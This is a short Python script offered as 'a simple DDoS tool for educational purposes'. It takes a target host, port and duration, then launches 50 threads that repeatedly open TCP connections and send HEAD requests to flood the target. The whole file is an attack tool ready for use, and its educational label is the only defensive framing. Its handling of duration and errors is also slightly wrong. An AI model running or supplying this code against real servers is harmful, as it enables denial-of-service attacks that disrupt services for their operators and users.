#!/usr/bin/env python3

import argparse
import requests
import socket
import sys
from time import sleep
from threading import Thread

def send_request(port, target, duration):
   """Sends a request to the target server."""
   for _ in range(duration):
       try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect((target, int(port)))
           s.send(b"HEAD / HTTP/1.1\r\n\r\n")
           s.close()
       except socket.error:
           pass
       except ValueError:
           print(f"Error: '{port}' is not a valid port number.")
           sys.exit(1)

def main():
   """Handles the command line arguments and runs the DDoS attack."""
   parser = argparse.ArgumentParser(description="A simple DDoS tool for educational purposes.")
   parser.add_argument("target", help="The target IP address or hostname.")
   parser.add_argument("port", help="The target port number.")
   parser.add_argument("duration", type=int, help="The duration of the attack in seconds.")

   args = parser.parse_args()

   target = args.target
   port = args.port
   duration = args.duration

   print(f"Initiating attack on {target}:{port} for {duration} seconds...")
   for _ in range(50):  # Adjust the number of threads to fine-tune the attack.
       t = Thread(target=send_request, args=(port, target, duration))
       t.start()
       sleep(0.1)

if __name__ == "__main__":
   main()
